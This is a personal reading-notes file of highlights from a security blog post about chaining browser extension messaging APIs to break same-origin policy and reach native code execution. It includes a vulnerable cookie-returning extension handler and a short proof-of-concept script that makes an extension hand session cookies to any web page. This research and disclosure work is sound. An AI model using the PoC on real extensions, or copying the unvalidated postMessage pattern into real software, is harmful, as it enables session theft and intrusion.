---
author: Spaceraccoon's Blog
aliases:
  - Universal Code Execution by Chaining Messages in Browser Extensions
tags:
  - readwise/articles
url: https://spaceraccoon.dev/universal-code-execution-browser-extensions/
created: 2024-08-21
---
# Universal Code Execution by Chaining Messages in Browser Extensions

![rw-book-cover](https://spaceraccoon.dev/images/31/browser-extension-message-chain.png)

## Highlights


> By chaining various messaging APIs in browsers and browser extensions, I demonstrate how we can jump from web pages to “universal code execution”, breaking both [Same-origin policy (SOP)](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Same-origin%20policy%20(SOP).md) and the browser sandbox. I provide two new vulnerability disclosures affecting millions of users as examples. In addition, I demonstrate how such vulnerabilities can be discovered at scale with a combination of large dataset queries and static code analysis.
> [View Highlight](https://read.readwise.io/read/01j5tgqy922ga0426vxxd4swcd)


> As observed by Arseny Reutov as early as 2017 in [“PostMessage Security in Chrome Extensions”](https://owasp.org/www-chapter-london/assets/slides/OWASPLondon_PostMessage_Security_in_Chrome_Extensions.pdf), there’s a way to relay messages from a web page all the way to native applications, and not much has improved since then.
> [View Highlight](https://read.readwise.io/read/01j7gdxejct01wk17am7akvqbs)



## Content Scripts Message Passing

>  Often, browser extensions need to execute JavaScript in the context of the page a user is visiting. For example, a browser may modify the document object model (DOM) of a page. These extensions must declare *content scripts* in their [`manifest.json` file](https://developer.chrome.com/docs/extensions/develop/concepts/content-scripts), for example:
> ```json
> 	 "content_scripts": [
> 	 {
> 	 "js": [
> 	 "js/contentscript.js"
> 	 ],
> 	 "matches": [
> 	 "http://*/*",
> 	 "https://*/*"
> 	 ],
> 	 "all_frames": true
> 	 }
> 	 ]
>  ```
>  In this case, the `js/contentscript.js` script in the extension will be injected into all frames in any pages matching the pattern.
> [View Highlight](https://read.readwise.io/read/01j7gdzzfsm72vsg9xtaxn868v)



> This is of course an extremely powerful capability, which is why content scripts are placed in [private execution environments called “isolated worlds”](https://developer.chrome.com/docs/extensions/develop/concepts/content-scripts#isolated_world), greatly limiting the damage that could occur if, for example, a DOM XSS exists in a content script. Content scripts cannot access JavaScript variables on the web page or other injected content scripts and operate within a separate [default content security policy](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Content_Security_Policy#default_content_security_policy) which prevents inline JavaScript execution.
> [View Highlight](https://read.readwise.io/read/01j7ge0tf1ak2dxvyrvvfzgq7k)



> n order to execute more complex functionality beyond modifying the page DOM, a content script must pass messages to its extension’s *background script* or *service worker* that run in a [separate page context](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Background_scripts#dom_apis). One common pattern is that these background scripts act as event handlers to messages passed from content scripts which contain information about loaded web pages.
> [View Highlight](https://read.readwise.io/read/01j7ge23cj5qy1adfp295z1x3f)



> One common method is via [`chrome.runtime.sendMessage()`](https://developer.chrome.com/docs/extensions/develop/concepts/messaging)
> [View Highlight](https://read.readwise.io/read/01j7ge2e8nqsbybtea2kvwwvc0)



> While cross-extension messaging is possible, most extensions only allow message passing between their own content scripts and background scripts. Unfortunately, as hinted earlier, there are many ways in which malicious web pages can barge into this conversation.
> [View Highlight](https://read.readwise.io/read/01j7ge3naewdfaemq1v5kd508g)



## `postMessage()` to `sendMessage()`

>  One common vulnerable pattern in extension content scripts is lack of origin validation in `postMessage` handlers.
> [View Highlight](https://read.readwise.io/read/01j7ge3ya6kftcyw776pxtf0k8)



> `postMessage` is a separate messaging mechanism from `sendMessage`, often used for cross-window/tab messaging by web pages, not extensions. [^1]
> [View Highlight](https://read.readwise.io/read/01j7ge480e1gk1zpn1ny69zdbz)



> consider a simple use case in which a web page wants to check the version of the extension. Recall that content scripts operate in an isolated world and cannot access JavaScript variables in the web page they are embedded in. However, content scripts still share access to the page’s DOM and can thus receive `postMessage` messages.
> [View Highlight](https://read.readwise.io/read/01j7ge6agc941dhdbgarbyn9ac)



> ![](https://spaceraccoon.dev/images/31/browser-extension-message-chain.png)
> [View Highlight](https://read.readwise.io/read/01j7ge7ye84h1yfysjm7syyytk)



## Breaking [Same-origin policy (SOP)](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Same-origin%20policy%20(SOP).md)

>  By exploiting the trust boundary between content scripts and background scripts, malicious web pages can easily break Same Origin Policy protections using the expanded capabilities of a vulnerable extension.
> [View Highlight](https://read.readwise.io/read/01j7ge97n57q9cf0eryqqmk5e3)



> example is “Extension A” with 300,000 users which “provides enhanced user experience” for `https://website-a.com`. However the extension manifest injects content scripts on every page, not just `https://website-a.com`:
>```js
>  "content_scripts": [
>  {
>  "js": [
>  "js/jquery-3.2.1.min.js",
>  "js/contentscript.js",
>  ],
>  "matches": [
>  "http://*/*",
>  "https://*/*"
>  ],
>  "all_frames": true
>  }
>  ```
>  In addition, the extension has permissions to access the cookies of multiple other origins:
>```js
>  "permissions": [
>  "cookies",
>  "webRequest",
>  "webRequestBlocking",
>  "https://website-a.com/*",
>  "https://website-b.com/*",
>  "https://*.website-c.com/*"
>  ]
>```
>  Utilising the same embedding page commuication pattern, the background script accepts the following message type that simply returns all cookies for the requested domain:
>```js
>  chrome.runtime.onMessage.addListener(function(a, b, c) {
>  switch (a.Action) {
>  // ...
>  case "GETCOOKIE":
>  GetCookie(a, b.tab.id);
>  break;
>  // ...
>  function GetCookie(a, b) {
>  chrome.cookies.getAll({
>  domain: a.URL
>  }, function(c) {
>  var d = [];
>  $(c).each(function() {
>  d.push({
>  name: this.name,
>  value: this.value,
>  domain: this.domain,
>  secure: this.secure,
>  path: this.path
>  })
>  });
>  a.Data = JSON.stringify(d);
>  SendMessage("ONRESULT", a, b)
>  })
>  }
>```
>  Therefore, any webpage from any domain that includes the following script can trigger the extension to return session cookies from the whitelisted domains back to the page:
>```js
>  function runPoc() { 
>  const payload = {
>  Action: "GETCOOKIE",
>  background: true,
>  URL: "website-a.com"
>  }
>  window.postMessage(payload, '*'); 
>  }
>  setTimeout(runPoc, 1000)
>```
> [View Highlight](https://read.readwise.io/read/01j7geb8se4geqq4r5d52awc3s)

## RCE

> to go beyond existing research and web-only impact, we can turn to another browser extension capability: native messaging. This allows background scripts to communicate with *native applications* running on the host operating system itself.
> [View Highlight](https://read.readwise.io/read/01j7gec1bbhdfeky57j3ged4bq)



> These native applications must declare a *native messaging host manifest file* that is then referenced by the browser when starting the application.
>```json
>  {
>  "name": "com.my_company.my_application",
>  "description": "My Application",
>  "path": "C:\\Program Files\\My Application\\chrome_native_messaging_host.exe",
>  "type": "stdio",
>  "allowed_origins": ["chrome-extension://knldjmfmopnpolahpmmgbagdohdnhkik/"]
>  }
>```
>  Once started, the browser will handle passing messages from the extension to the process specified by `path` using `stdin` and `stdout`. The background script can then send a message using `chrome.runtime.sendNativeMessage()`:
>```js
>  chrome.runtime.sendNativeMessage(
>  'com.my_company.my_application',
>  {text: 'Hello'},
>  function (response) {
>  console.log('Received ' + response);
>  }
>  );
>```
> [View Highlight](https://read.readwise.io/read/01j7gecyfbxwgsk0e4qz3qrd2t)



> Meanwhile, the native application can handle the `stdin` message any way it wants - sometimes dangerously.
> [View Highlight](https://read.readwise.io/read/01j7gedkbpw190a3q0ghz12z4n)



> We thus have a complete chain for universal code execution:
>  1. Browser extension has a wildcard pattern for content script.
>  2. Content script passes `postMessage` messages to the background script using `sendMessage`.
>  3. Background script passes the message to native application using `sendNativeMessage`.
>  4. Native application handles the message dangerously, leading to code execution.
>  ![](https://spaceraccoon.dev/images/31/native-message-chain.png)
> [View Highlight](https://read.readwise.io/read/01j7gedr2q43v6qj88c6cx239a)

[^1]: [PostMessage and EventListener](../../Dev,%20ICT%20&%20Cybersec/Dev,%20scripting%20&%20OS/JavaScript%20&%20NodeJS.md#PostMessage%20and%20EventListener)

